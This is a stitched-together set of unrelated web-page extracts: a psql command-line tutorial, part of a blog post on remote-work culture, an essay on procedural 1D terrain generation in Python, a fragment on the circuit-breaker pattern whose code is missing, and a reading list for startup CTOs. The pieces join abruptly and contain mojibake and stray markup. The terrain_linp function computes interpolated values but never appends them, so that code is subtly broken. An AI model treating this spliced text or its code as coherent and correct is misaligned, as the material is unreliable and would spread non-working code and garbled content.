<h3 id="opening-a-connection-locally">Opening a connection locally</h3>

<p>A common case during development is opening a connection to a local database (one on your own machine).
Run <code>psql</code> with <code>-U</code> (for user name) followed by the name of the database, <code>postgres</code> in this example:</p>
<div><div><pre><code># Log into Postgres as the user named postgres
$ psql -U postgres
</code></pre></div></div>

<h3 id="opening-a-connection-remotely">Opening a connection remotely</h3>

<p>To connect your remote PostgreSQL instance from your local machine, use <code>psql</code> at your operating system command line.
Here’s a typical connection.</p>

<div><div><pre><code><span># -U is the username (it will appear in the \l command)</span>
<span># -h is the name of the machine where the server is running.</span>
<span># -p is the port where the database listens to connections. Default is 5432.</span>
<span># -d is the name of the database to connect to. I think DO generated this for me, or maybe PostgreSQL.</span>
<span>$ </span>psql <span>-U</span> doadmin <span>-h</span> production-sfo-test1-do-user-4866002-0.db.ondigitalocean.com <span>-p</span> 25060 <span>-d</span> defaultdb
</code></pre></div></div>

<p>Here you’d enter the password. In case someone is peering over your shoulder, the characters are hidden. After you’ve entered your information properly you’ll get this message (truncated for clarity):</p>

<h3 id="looking-at-the-psql-prompt">Looking at the psql prompt</h3>
<p>A few things appear, then the <code>psql</code> prompt is displayed.
The name of the current database appears before the prompt.</p>

<div><div><pre><code>psql (11.1, server 11.0)
Type "help" for help.

postgres=# 
</code></pre></div></div>

<p>At this point you’re expected to type commands and parameters into the command line.</p>

<h3 id="psql-vs-sql-commands">psql vs SQL commands</h3>

<p><code>psql</code> has two different kinds of commands. Those starting with a backslash
are for <code>psql</code> itself, as illustrated by the use of <code>\q</code> to quit.</p>

<p>Those starting with valid SQL are of course interactive SQL used to
create and modify PostgreSQL databases.</p>

<h3 id="warning-sql-commands-end-with-a-semicolon">Warning: SQL commands end with a semicolon!</h3>

<p>One gotcha is that almost all SQL commands you enter into <code>psql</code> must end in a semicolon.</p>

<ul>
  <li>For example,suppose you want to remove a table named <code>sample_property_5</code>. You’d enter this command:</li>
</ul>

<div><div><pre><code>postgres=# DROP TABLE "sample_property_5";
</code></pre></div></div>

<p>It’s easy to forget. If you do forget the semicolon, you’ll see this perplexing prompt.
Note that a <code>[</code> has been inserted before the username portion of the prompt, and another
prompt appears below it:</p>

<div><div><pre><code>[postgres=# DROP TABLE "sample_property_5"
postgres=#

</code></pre></div></div>

<p>When you do, just remember to finish it off with that semicolon:</p>

<div><div><pre><code>[postgres=# DROP TABLE "sample_property_5"
postgres=# ;
</code></pre></div></div>

<h3 id="scrolling-through-the-command-history">Scrolling through the command history</h3>

<ul>
  <li>Use the up and down arrow keys to move backwards and forwards through the command history.</li>
</ul>

<h2 id="getting-information-about-databases">Getting information about databases</h2>

<p>These aren’t SQL commands so just press Enter after them. Remember that:</p>

<ul>
  <li>When there’s more output than fits the screen, it pauses. Press space to continue</li>
  <li>If you want to halt the output, press <code>q</code>.</li>
</ul>

<h3 id="h-help">\h Help</h3>

<div><div><pre><code># Get help. Note it's a backslash, not a forward slash.
postgres=# \h
</code></pre></div></div>
<p>You’ll get a long list of commands, then output is paused:</p>

<div><div><pre><code>Available help:
  ABORT                            CREATE USER
  ...
  ALTER AGGREGATE                  CREATE USER MAPPING
  ALTER PROCEDURE                  DROP INDEX
:
</code></pre></div></div>

<ul>
  <li>Press space to continue, or <code>q</code> to stop the output.</li>
</ul>

<p>You can get help on a particular item by listing it after the <code>\h</code> command.</p>

<ul>
  <li>For example, to get help on <code>DROP TABLE</code>:</li>
</ul>

<pre><code>postgres=# \h drop table
</code></pre>

<p>You’ll get help on just tha item:</p>

<pre><code>Command:     DROP TABLE
Description: remove a table
Syntax:
DROP TABLE [ IF EXISTS ] name [, ...] [ CASCADE | RESTRICT ]
</code></pre>

<h3 id="l-list-databases">\l List databases</h3>

<p>What most people think of as a database (say, a list of customers) is actually a table. A database is a set of tables, information about those tables, information about users and their permissions, and much more. Some of these databases (and the tables within) are updated automatically by PostgreSQL as you use them.</p>

<p>To get a list of all databases:</p>

<pre><code>postgres=# \l
                                  List of databases
   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-----------+----------+----------+-------------+-------------+-----------------------
 visitor   | tom      | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 markets   | tom      | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
 template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
 tom       | tom      | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 

</code></pre>

<p>You can get info on a single database by following the <code>\l</code> prompt with its name.</p>

<ul>
  <li>For example, to view information about the <code>template0</code> database:</li>
</ul>

<pre><code>postgres=# \l template0
</code></pre>

<p>The output would be:</p>

<pre><code>postgres=# \l
                                  List of databases
   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-----------+----------+----------+-------------+-------------+-----------------------
 template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
</code></pre>

<h3 id="l-list-databases-with-size-tablespace-and-description">\l+ List databases with size, tablespace, and description</h3>

<p>To get additional information on the space consumed by database tables
and comments describing those tables, use <code>\l+</code>:</p>

<pre><code>postgres=# \l+
</code></pre>

<h3 id="x-expandnarrow-table-lists">\x Expand/narrow table lists</h3>

<p>Use <code>\x</code> (X for eXpanded listing) to control 
whether table listings use a wide or narrow format.</p>

<h2 id="remotely-happy">Remotely happy</h2>
<p>There are plenty of reasons to adopt a remote working model. Employees get to
choose where to live independently of where they work and save a lot of time and
money on sometimes long commutes (which is also great for the climate â€“ with all
the focus currently being on Covid 19 we must not forget about the real
existential crisis humanity is facing after all). Companies also benefit as they
can attract the best talent from anywhere and are not limited in terms of who
they can hire by their location.</p>
<p>Yet, even as employees and companies alike are eager to adopt remote work and in
theory all the required infrastructure and tools are available, it is still not
easy to get right. Many teams and companies are struggling to go remote and
yearn for the return of the days of the office. The reality is those days are
not going to come back in many industries though and making remote work a
success is going to be one of the key challenges many companies will be facing
in the coming years.</p>
<p>We have run simplabs as a remote company since the beginning. In the early days,
we faced many of the same challenges other teams are struggling with now. Over
time, we overcame each one, and learned a lot along the way. Today, we have team
members in six countries across Europe with people working from co-working
offices in Berlin, kitchens in Augsburg, sheds in Dublin, or even from a
sailboat in Portugal. And we're not the only ones enjoying the many advantages
of working remotely â€“ 90% of remote workers say they plan to remain remote for
the rest of their careers and 94% would even encourage others to work remotely
as well according to
<a href="https://buffer.com/resources/state-remote-work-2018/" target="_blank" rel="noopener">a study by Buffer</a> that
was conducted in 2018.</p>
<h2 id="a-remote-culture">A remote culture</h2>
<p>Adopting a remote working model does not necessarily have to mean for everyone
to go remote immediately. It can of course be adopted completely and for
everyone but also partially or incrementally as an option only while still
keeping the office for everyone who likes to continue working from it. However,
it is an allâ€“orâ€“nothing kind of change in terms of working culture regardless of
how many team members will actually be working remotely. Remote work requires
fundamentally different practices when it comes to collaboration and management
and a lot of attention to aspects that are less relevant when the entire team
works from the same location.</p>
<p>Possibly the single most important of these aspects is transparency and the flow
and sharing of information. While diagrams, concepts, or calendars pinned to the
wall (or the sticky-notes sprint board that has turned into a status symbol for
teams that "do agile" in the past years) are reasonable and probably good tools
for sharing information among people that all work from the same location, in a
remote environment, these practices don't work. All information shared in such
ways will be completely invisible for everyone who is not in the office,
excluding remote team members from participating in decision-making processes
and preventing them from effectively contributing to the common goal.</p>
<figure><img alt="Burn down your sticky notes walls" srcset="https://simplabs.com/assets/images/posts/2020-11-16-the-guide-to-making-remote-work-work/burn-down-your-sticky-notes-walls@1000-79f1f215bf9f7d20d95247c1363bcd23.jpg 1000w, https://simplabs.com/assets/images/posts/2020-11-16-the-guide-to-making-remote-work-work/burn-down-your-sticky-notes-walls@2000-224accf0036ced2f3423fcb4d8bc2ccc.jpg 2000w" sizes="(max-width: 887px) 1000px, 2000px"></figure>
<p>While direct communication in the office is not something anyone should
prohibit, all the information and decisions that are made in any conversations
must be made transparent to the entire team. Writing summaries and protocols of
face-to-face conversations or communicating via a chat tool although sitting at
the desk next to the person one is having a conversation with feels strange in
the beginning. It is however a necessary prerequisite for making remote work
work at all and failing to do it properly will alienate remote teammates. In
that way, the pandemic that forced teams to go fully remote all at once at the
same time might even have made the transition easier rather than harder for them
because everyone was in the same position and shared the same perspective.</p>
<h3 id="cultivating-trust">Cultivating Trust</h3>
<p>Another very important cultural aspect to consider when a team goes fully or
partly remote is trust. Many managers' first reaction, when faced with their
teams working remotely, is asking</p>
<p><em>"How can I know my team actually works when everyone is sitting at home?"</em></p>
<p>Just because managers cannot <strong>see</strong> the work happening does not mean it does
not happen. Managers' desire to micro-manage teams is an equally bad habit
regardless of whether the team is remote or not â€“ yet, remote teams seem to
increase that desire, often resulting in managers being on everyone's back
constantly and consistently even more than with all of the team working from the
office. However, the occasional check-in for a status update is just as
interruptive remotely as it is in the office.</p>
<figure><img alt="Direct messages are interruptive and keep people from working" srcset="https://simplabs.com/assets/images/posts/2020-11-16-the-guide-to-making-remote-work-work/slack@1000-3d75f68182ec16f78066993a31c4d5d6.png 1000w, https://simplabs.com/assets/images/posts/2020-11-16-the-guide-to-making-remote-work-work/slack@2000-c665229d789cffd7a3165c4c44f77a26.png 2000w" sizes="(max-width: 887px) 1000px, 2000px"></figure>
<p>The reality is that remote workers are likely more productive rather than less
as they will find it easier to focus and be less stressed according to the
<a href="https://www.owllabs.com/hubfs/Owl%20Labs%202019%20State%20of%20Remote%20Work%20Report%20PDF.pdf" target="_blank" rel="noopener">State of Remote Work 2019 report by OWLLabs</a>.
Building up that trust and allowing people uninterrupted time to focus while
giving up on micro-management practices is going to be a task for many managers
to learn over the next years.</p>

<p>Working remotely requires adapting a number of infrastructure and tooling. There
are a plethora of great tools available and many companies are even using some
of them already. Which exact tools a team uses is not even so relevant and there
are plenty of options available â€“ mostly those fall into three categories:</p>
<ul>
<li>tools for ad-hoc, real-time communication</li>
<li>tools for knowledge management and sharing</li>
<li>tools for organizing work and communicating status</li>
</ul>
<p>While it is important to have tools for all of these use cases, it is equally
important to keep the total number of tools in use to a minimum to prevent
chaos. There is always going to be the new hip tool that everyone wants to try
and doing so often silently makes that new tool part of the de-facto toolset a
team uses, growing that little by little over time. Eventually, teams then end
up with entire landscapes of tools, where nobody knows what kind of information
goes where and although each tool is perfectly good in isolation, in combination
they cause more confusion than they support the team.</p>

<p>Team chat tools like Slack (or Microsoft Teams for the more classic companies)
have seen widespread adoption over the past years and there are only a few
companies that don't use any of those at this point. They have developed into
the backbone for remote work for many teams. While in an office environment,
sending someone or a group of people a chat message saves you having to walk
over to a separate room or building, in a remote environment it is the <strong>only</strong>
way to reach out to someone directly (unless you call the person but who does
phone calls anymore?). What's easy to forget is how interruptive these tools can
be. Sending someone a chat message always implies urgency. Even if we all know
the majority of chat messages we get are in fact not urgent, it's hard to ignore
someone who just starts talking (writing) to you.</p>
<p>While most remote workers experience it is easier to focus, a liberal
communication style on team chat can demolish a lot of that increased focus
again. For effective communication, it is important to be respectful of other
people's time and need to focus on their work. Not everything is urgent all of
the time and justifies notifying a coworker or even a group of people. The fact
that you feel like you need something now doesn't necessarily mean someone else
should stop what they are currently doing to answer you. In many cases, sending
a good old email that is going to be less intrusive and more respectful of the
recipient's time is the better communication option compared to sending the
person a message on team chat asking for something that could totally wait until
tomorrow as well.</p>
<p>At the same time, it is important to keep people in the loop and ensure
transparency of communication when using any kind of communication tool.
Communication that happens via direct messages between two people is invisible
to everyone else, while it might actually be relevant to others as well. As a
rule of thumb, we recommend keeping everything in public channels unless the
topic is strictly confidential or private in nature.</p>
<p>Although the information in public channels will be accessible to everyone, it
is important to understand any real-time communication tool is essentially
ephemeral in nature. While that is not technically correct and most tools do in
fact store all communication indefinitely, even with built-in search
functionality it is practically impossible to find a piece of information you
are looking for that was discussed for example in some Slack channel (you likely
don't even remember which one) the day before. So while team chat is a good
mechanism to communicate among the team in a low effort, informal way, any
information or decisions that are made via it need to eventually make their way
into other, more permanent, and organized systems.</p>
<h4 id="video-conferencing">Video Conferencing</h4>
<p>Besides text-based communication systems, of course, video conferences play a
major role in remote work as well. That way of communication has seen a huge
boost in adoption during the pandemic with everyone isolating at home and many
people using video calls for the first time even (I'm sure everyone had their
<em>"Dad, the camera is pointing on the floor"</em> moments). While late adopters
expectedly struggled with the technology, many remote teams experience similar
problems during their daily work lives. Poor audio or video quality, dogs
barking in the background, calls starting 10min late until everyone has figured
out their setup, etc. are common problems for many teams and have a severe
negative effect on meeting efficiency.</p>
<p>All these problems are easy to prevent when following a number of simple
practices:</p>
<ul>
<li>There needs to be proper audio and video hardware in place. For two or more
people joining a call together that means a proper conference speaker that
ensures people on the other end will be able to hear everyone in the room even
if more than one person …</li></ul></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Terrains are at the heart of every Computer Game - be it Counter-Strike, Age of Empires, or even Minecraft. The virtual world that these games generate is the key to a great gaming experience. Generating terrain, manually, requires a ton of effort and hence it makes sense to auto-generate a pseudorandom terrain using some procedure. In this essay, we take a detailed look into generating pseudorandom one-dimensional terrain that is very close to real ones.</p>

<p>A one-dimensional terrain is a bunch of heights defined at every point along the X-axis. An example of this could be seen in games like Flappy Bird, Galaxy, and many more. Such terrain could also be traced as the skylines of mountain ranges.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/99189082-70b55e00-2785-11eb-87c0-6d95568f709a.png" alt="https://user-images.githubusercontent.com/4745789/99189082-70b55e00-2785-11eb-87c0-6d95568f709a.png"></p>
<p>The illustration above shows a one-dimensional terrain and is taken as a sketch of a distant mountain range. The procedure we define should generate terrains as close to natural ones as possible.</p>

<p>A naive solution to generate a random terrain is by using the <code>random</code> function for each point along the X-axis. The <code>random</code> function yields random values in the interval <code>[0, 1]</code>, and we map these values to the required height, for example <code>[0, 100]</code>.  The 1D terrain generation algorithm using the default random function is thus defined as</p>
<pre><code><span>import</span> random

<span><span>def</span> <span>mapv</span><span>(v, ol, oh, nl, nh)</span>:</span>
    <span>"""maps the value `v` from old range [ol, oh] to new range [nl, nh]
    """</span>
    <span>return</span> nl + (v * ((nh - nl) / (oh - ol)))

<span><span>def</span> <span>terrain_naive</span><span>(count)</span> -&gt; List[float]:</span>
    <span>"""returns the list of integers representing height at each point.
    """</span>
    <span>return</span> [
        mapv(random.random(), <span>0</span>, <span>1</span>, <span>0</span>, <span>100</span>)
        <span>for</span> i <span>in</span> range(count)
    ]
</code></pre>
<p>The <code>mapv</code> function defined above comes in very handy as it helps us to map value from a source range to a target range. The terrain generation function <code>terrain_naive</code> takes in <code>count</code> as input, suggesting the number of points along the X-axis, and it returns a list of float values representing height at each of the <code>count</code> number of points along the terrain.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/99189731-9db74000-2788-11eb-98d3-0138a7378d77.png" alt="https://user-images.githubusercontent.com/4745789/99189731-9db74000-2788-11eb-98d3-0138a7378d77.png"></p>
<p>The above illustration shows the plot of the one-dimensional terrain using the above <code>terrain_naive</code> function. The terrain generated using this procedure has a lot of spikes and abrupt changes in height and it clearly does not mimic the terrains in the real world. Real-world terrains, although random, does not have a lot of sharp spikes, instead, the changes in height are very gradual and ensure some degree of smoothness.</p>
<p>In order to bring smoothness to <code>terrain_naive</code> generated terrains, we take a look at a famous estimation technique called <a href="https://en.wikipedia.org/wiki/Interpolation">interpolation</a> which estimates intermediate values given a bunch of known points.</p>

<p>Interpolation is a method of constructing new data points within a range of a discrete set of known data points. Interpolation methods estimate the intermediate data points ensuring a "smoothened" transition from one known point to another. There are several interpolation methods but we restrict our focus to <a href="https://en.wikipedia.org/wiki/Linear_interpolation">Linear</a> and <a href="https://en.wikipedia.org/wiki/Trigonometric_interpolation">Cosine</a> interpolation methods.</p>
<h3>Linear Interpolation</h3>
<p>Linear interpolation estimates the intermediate points between the known points assuming collinearity. Thus given two known points <code>a</code> and <code>b</code>, using linear interpolation, we estimate an intermediate point <code>c</code> at a relative distance of <code>mu</code> from <code>a</code> using the function defined below</p>
<pre><code><span><span>def</span> <span>linp</span><span>(a, b, mu)</span>:</span>
    <span>"""returns the intermediate point between `a` and `b`
    which is `mu` factor away from `a`.
    """</span>
    <span>return</span> a * (<span>1</span> - mu) + b * mu
</code></pre>
<p>The value of the parameter <code>mu</code> ranges in the interval <code>[0, 1]</code> where <code>0</code> implies the point being estimated and interpolated is at <code>a</code> while <code>1</code> implies it is at the second point <code>b</code>.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/99184683-d0ead680-276a-11eb-9b4d-6c78dbf3c197.png" alt="https://user-images.githubusercontent.com/4745789/99184683-d0ead680-276a-11eb-9b4d-6c78dbf3c197.png"></p>
<h3>Cosine Interpolation</h3>
<p>Linear interpolation is not always desirable as the plot sees a lot of discontinuous and sharp transitions. When the plot is expected to be smoother, it is where the Cosine Interpolation comes in handy. Instead of assuming intermediate points are collinear with the known ones, Cosine Interpolation, plots them on a cosine curve passing through the known points, providing a much smoother transition. This is could be seen in the illustration above.</p>
<pre><code><span>import</span> math

<span><span>def</span> <span>cosp</span><span>(a, b, mu)</span>:</span>
    <span>"""returns the intermediate point between `a` and `b`
    which is `mu` factor away from `a`.
    """</span>
    mu2 = (<span>1</span> - math.cos(mu * math.pi)) / <span>2</span>
    <span>return</span> a * (<span>1</span> - mu2) + b * mu2
</code></pre>
<p>The above code snippet computes and estimates intermediate point <code>c</code> at a relative distance of <code>mu</code> from the first point <code>a</code> using Cosine Interpolation. Note there are other interpolation methods, but we can solve all major of our use cases using these two.</p>

<p>We can apply interpolation to our naively generated terrain and make transitions smoother leading to fewer spikes. In the real-world, the transitions in the terrain are gradual with peaks being widespread; we can mimic the pattern by sampling <code>k</code> points from the naive terrain which could become our desired peaks, and interpolate the rest of the points lying between them.</p>
<p>This should ideally help us reduce the sudden spikes and make the terrain look much closer to really like. A simple python code that outputs linearly interpolated terrain that samples every <code>sample</code> points from the naive one is as follows</p>
<pre><code><span><span>def</span> <span>terrain_linp</span><span>(naive_terrain, sample=<span>4</span>)</span> -&gt; List[float]:</span>
    <span>"""Using naive terrain `naive_terrain` the function generates
    Linearly Interpolated terrain on sample data.
    """</span>
    terrain = []

    
    sample_points = naive_terrain[::sample]

    
    <span>for</span> i <span>in</span> range(len(sample_points)):

        
        terrain.append(sample_points[i])

        
        
        <span>for</span> j <span>in</span> range(sample - <span>1</span>):
            
            mu = (j + <span>1</span>)/sample
          
            
            a = sample_points[i]
            b = sample_points[(i + <span>1</span>) % len(sample_points)]
            v = linp(a, b, mu)

            

    
    <span>return</span> terrain
</code></pre>
<p>The above code snippet generates intermediate points using Linear Interpolation but we can very easily change the interpolation function to Cosine Interpolation and see the effect in action. The sampling and interpolating on a naively generated terrain for different values of sample is as shown below</p>
<p><img src="https://user-images.githubusercontent.com/4745789/99227920-e7983880-2811-11eb-9c79-bed5cad2eed3.png" alt="https://user-images.githubusercontent.com/4745789/99227920-e7983880-2811-11eb-9c79-bed5cad2eed3.png"></p>
<p>For each interpolation, the 5 plots shown above are sampled for every <code>1</code>, <code>2</code>, <code>3</code>, <code>4</code>, and <code>5</code> points respectively. We can clearly see the plots of Cosine Interpolation are much smoother than Linear Interpolated ones. The technique does a good job over naive implementation but it still does not mimic what we see in the real world. To make things as close to the real-world as possible we use the concept of <a href="https://en.wikipedia.org/wiki/Superposition_principle">Superposition</a>.</p>

<p>Sampling and Interpolation are effective in reducing the spikes and making transitions gradual. The concern with this approach is that sudden changes are not really gone. In order to address this situation, we use the principle of Superposition upon multiple such sampled terrains.</p>
<p>The approach we take here is to generate <code>k</code> such terrains with different sampling frequencies and then perform a normalized weighted sum. This way we get the best of both worlds i.e smoothness from the terrain with the least sampled points and aberrations from the one with the most sampled points.</p>
<p>Now the only piece that remains is choosing the weights. The weights and sampling frequency varies by the power of <code>2</code>. The number of terrains to be sampled depends on the kind of terrain needed and is to be left for experimentation, but we can assume it to be 6 for most use cases.</p>
<p>The terrain that samples all the points should be given the least weight as it aims to contribute sudden spikes; and as we increase the sampling frequency by the power of <code>2</code> we increase the weight by the power of <code>2</code> as well. Hence for the first terrain, the scale is <code>0.03125</code> where were sample all the points <code>256</code>, the next terrain is sampled with <code>128</code> points and has a scale of <code>0.0625</code>, and so on till we reach sampled points to be <code>8</code> with scale as <code>1</code>, giving it the highest weight.</p>
<p>Once these terrains are generated we perform a normalized weighted sum and generate the final terrain as shown in the illustration below.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/99264852-0107a780-2847-11eb-9bd1-2e2994c56028.png" alt="https://user-images.githubusercontent.com/4745789/99264852-0107a780-2847-11eb-9bd1-2e2994c56028.png"></p>
<p>The illustration above shows 6 scaled sampled terrains with different sampling frequencies along with the final super-positioned terrain generated from the procedure. It is very clear that the terrain generated using this procedure is much more closer to the real world terrain than any other we have seen before. Python code that generated the above terrain is as below</p>
<pre><code><span><span>def</span> <span>terrain_superpos_linp</span><span>(naive_terrain, iterations=<span>8</span>)</span> -&gt; List[float]:</span>
    <span>"""Using naive terrain `naive_terrain` the function generates
    Linearly Interpolated Superpositioned terrain that looks real world like.
    """</span>
    terrains = []

    
    weight_sum = <span>0</span>

    
    <span>for</span> z <span>in</span> range(iterations, <span>0</span>, <span>-1</span>):
        terrain = []

        
        weight = <span>1</span> / (<span>2</span> ** (z - <span>1</span>))

        
        
        sample = <span>1</span> &lt;&lt; (iterations - z)

        
        sample_points = naive_terrain[::sample]
        
        weight_sum += weight

        <span>for</span> i <span>in</span> range(len(sample_points)):

            
            terrain.append(weight * sample_points[i])

            
            
            <span>for</span> j <span>in</span> range(sample - <span>1</span>):
                
                mu = (j + <span>1</span>) / sample

                
                a = sample_points[i]
                b = sample_points[(i + <span>1</span>) % len(sample_points)]
                v = linp(a, b, mu)

                
                terrain.append(weight * v)

        
        
        terrains.append(terrain)

    
    
    <span>return</span> [sum(x)/weight_sum <span>for</span> x <span>in</span> zip(*terrains)]
</code></pre>
<p>If the terrain to be generated is needed to be smoother then instead of using Linear Interpolation switch to Cosine Interpolation and the resultant terrain will be much smoother and curvier as seen in the illustration below.</p>

    </undefined></p><p>The idea behind this pattern is very simple: <strong>Failures are inevitable, and trying to prevent them altogether is not realistic</strong>. </p><p>A way to handle these failures is by wrapping these operations into some kind of proxy. This proxy is responsible for monitoring recent failures, and using this information to decide whether to allow the operation to proceed or return an early failure instead. </p><p>This proxy is typically implemented as a state machine that mimics the functionality of a physical <strong>circuit breaker</strong> which my have 3 states:</p><ul><li><strong>Closed:</strong> In this state the circuit breaker lets all the requests go through while keeping track of the number of recent failures, and if the number of failures exceeds a specific threshold within a specific time frame, it will switch to the <strong>Open</strong> state.</li><li><strong>Open:</strong> In this state, any requests are not sent to the external service. Instead we either fail immediately returning an extension, or fall back to a secondary system like a cache.  </li><li><strong>Half-Open:</strong> In this state, a limited number of requests from the application are allowed to pass-through and call our external service. Depending on the result of these requests the <strong>circuit breaker</strong> will either flip to a Closed state or go back to the Open state resetting the counter before trying to open again. </li></ul><p>The Circuit Breaker pattern offers a few key advantages worth noting:</p><ul><li>The <strong>Half-Open</strong> state gives the external system time to recover without getting flooded.</li><li>The <strong>Open</strong> state implementation gives options for how we want to handle failure, whether failing right away or falling back to a caching layer or secondary system. </li><li>This pattern can also be leveraged to help to maintain response times by <strong>quickly rejecting calls</strong> that are likely to fail or timeout. </li></ul><h2>Example</h2><p>For our example, let’s imagine that we have the following scenario:</p><blockquote><p>We are running a job board aggregator that will consume job postings from Github and other sources. However, since we are consuming a few different APIs we run the risk that we will hit a request limit or that an API will be down. </p></blockquote><p>Let’s start by creating an example API connector to <strong>Github Jobs</strong> that retrieves the latest 50 jobs posted:</p><div data-language="elixir"><pre><code><span>defmodule</span> CircuitBreaker<span>.</span>Api<span>.</span>GithubJobs <span>do</span>

There are plenty of opportunities to expand this pattern further, such as: </p><ul><li>Improve the logic for tripping the breaker by also looking at the type of errors, and frequency.</li><li>Add monitoring and logging once the circuit breaker changes state.</li><li>Fallback to a secondary service or cache layer before returning the failure. </li></ul><p>Finally, as with any pattern, it is important to keep in mind the use case and decided if this kind of behavior is desired.</p><p>The full code for this example can be found in <a href="https://github.com/amacgregor/circuit_breaker_example" target="_blank" rel="nofollow">circuit_breaker_example</a></p><h3>Further Reading</h3><ul><li><a href="https://docs.microsoft.com/en-us/azure/architecture/patterns/circuit-breaker" target="_blank" rel="nofollow">Microsoft - Circuit Breaker pattern</a></li><li><a href="https://netflixtechblog.com/fault-tolerance-in-a-high-volume-distributed-system-91ab4faae74a" target="_blank" rel="nofollow">Martin Fowler</a></li><li><a href="https://microservices.io/patterns/reliability/circuit-breaker.html" target="_blank" rel="nofollow">Microservice Architecture - Circuit Breaker Pattern</a></li></ul></div></div>]]>

</section>
<p>Being a great CTO requires <a href="https://www.karllhughes.com/posts/roles-of-startup-cto">insight and vision in both technology and business</a>. You have to be the perfect combination of a software engineer, manager, and entrepreneur. Besides technical skills, you need knowledge of marketing, project management, and product development. It’s a tough job, but one of the ways I learned to cope was reading…a lot.</p>
<p>Even in the internet era, it can be difficult to find reading material online that’s actually useful. After reading hundreds of books over the past few years, I decided to compile my top picks for startup Chief Technology Officers.</p>
<h2 id="early-stage">Early-Stage</h2>
<p>These books will be best for early-stage CTOs tasked with building an MVP and finding product-market fit. Some of these are classics, but they’re all still applicable today.</p>
<h3 id="crossing-the-chasm-marketing-and-selling-high-tech-products-to-mainstream-customers"><a href="https://amzn.to/2IhnpwT">Crossing the Chasm: Marketing and Selling High-Tech Products to Mainstream Customers</a></h3>
<p>Although Crossing the Chasm is a bit old, it’s not dated. The book is relevant to the high-tech industry today and shows you how fundamentally new products get introduced to the marketplace. Most interestingly, it shows you how to leap early adopters to the mainstream market.</p>
<p>“This book changed my life and the lives of my clients. I bought it in April 1999 and skimmed it. But it was not until April 2009 that I dug in to learn its secrets. I was simply amazed. The most basic point of this book is that the tactics that serve you well at one stage will sink you in the next, so you better orient yourself properly before shouting and writing big checks.”</p>
<h3 id="the-innovators-dilemma"><a href="https://amzn.to/35fBmV7">The Innovator’s Dilemma</a></h3>
<p>The Innovator’s Dilemma is the best-known work of Clayton Christensen, a Harward professor who coined the term “disruptive technologies.” This book explains how big, successful companies can quickly lose their market leadership as new competitors rise and become dominant in the market. The Economist named the book <a href="https://www.economist.com/books-and-arts/2011/06/30/aiming-high">one of the six most important business-related books ever written</a>.</p>
<p><a href="https://amzn.to/35fBmV7"><img src="https://i.imgur.com/gpFCbqW.jpg"></a></p>
<p>“I picked up this book after hearing the “innovator’s dilemma” alluded to in several interviews by different CEOs. After reading this interesting piece on business strategy, it is no surprise why executive level management teams enjoy quoting this book. Innovator’s Dilemma is a thoroughly researched investigation into an age-old business phenomenon: How do businesses who were once dominant players in their industry get displaced by smaller, upcoming rivals?”</p>
<h3 id="the-lean-startup"><a href="https://amzn.to/3lfyE7B">The Lean Startup</a></h3>
<p>In this classic startup book, Eric Ries talks about his startup’s failure, caused by spending too much time and energy on the initial product launch. The book helps entrepreneurs in companies of all sizes to adapt and adjust to new technologies before it’s too late. Ries provides a scientific approach to developing new ideas in an age where markets change rapidly and quick adaptation is of great importance.</p>
<p>“I have been running a software business for 30 years, and, after reading this book, my eyes were opened to the “system” for starting and growing a business. Eric provides the core processes for identifying, developing, and refining products and the key metrics to use for growing your business. I really appreciated his concepts of validated learning vs. the typical “gut” approach to decision making. I also got a lot of value out of his disdain for vanity metrics. I now feel like I have a framework for improving and growing my business. This book is an excellent resource for anyone looking to create products that create value.”</p>
<h3 id="zero-to-one"><a href="https://amzn.to/36hzwlH">Zero to One</a></h3>
<p>Written by legendary entrepreneur and investor Peter Thiel, this book teaches you the most critical skill that a startup founder must have - learning to think for himself. He mentions how the next Bill Gates or Larry Page won’t win by mercilessly fighting the competition. Instead, they will win by escaping the competition since their businesses will be unique.</p>
<p>“For starters, going from zero to one or intensive (vertical) progress means doing new things. Vertical progress is harder to imagine because it requires doing something no one else has done. In short, doing new things is wiser than copying things that work. Thiel is best in questioning conventional thinking, for he advises a start-up must question received ideas and rethink business from scratch.”</p>
<h3 id="getting-real-the-smarter-faster-easier-way-to-build-a-successful-web-application"><a href="https://amzn.to/2U6AKKY">Getting Real: The Smarter, Faster, Easier Way to Build a Successful Web Application</a></h3>
<p>Packed with unconventional approaches to software design, this book is a source of ideas for anyone working on a web application. It has inspired me to try different approaches to solving familiar problems and taught me to build better, cleaner code overall.</p>
<p>“Not everything in this book will apply to every situation. Our team works for the government as contractors; we are required to produce a lot of documentation to fulfill our contractual obligations. Outside of our paper deliverables, though, this book is spot on with software development. Getting Real isn’t full of theories - it’s full of techniques that work. I know this from my experience. The book was a great help in giving that knowledge to my coworkers as well.”</p>
<h3 id="founders-at-work-stories-of-startups-early-days"><a href="https://amzn.to/3eFyeES">Founders at Work: Stories of Startups’ Early Days</a></h3>
<p>Founders at Work is a collection of interviews with people who founded well-known technology companies. It includes interviews with Steve Wozniak, Max Levchin, Sabeer Bhatia, and other entrepreneurs who made a big impact on the market. I really liked their stories and how they climbed to the top from seemingly simple ideas.</p>
<p><a href="https://amzn.to/3eFyeES"><img src="https://i.imgur.com/M6ezJgD.jpg" alt="Founders at Work book"></a></p>
<p>“This book is perfect for anyone interested in entrepreneurship, technology startups, technology companies in general, and business books in general. I’ve read the book once already and now I’m in the middle of reading it a second time. I wish there were an audio version of it.”</p>
<h2 id="technical-challenges">Technical Challenges</h2>
